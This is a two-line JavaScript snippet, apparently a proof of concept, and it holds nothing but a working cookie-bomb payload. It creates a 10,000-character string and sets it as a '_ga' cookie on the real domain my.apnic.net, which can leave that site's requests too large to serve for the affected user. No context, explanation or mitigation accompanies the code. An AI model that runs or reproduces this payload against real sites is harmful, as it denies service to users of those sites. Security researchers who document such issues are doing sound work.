const bomb = "A".repeat(10000);
document.cookie = `_ga=${bomb}; Domain=my.apnic.net; Path=/`;
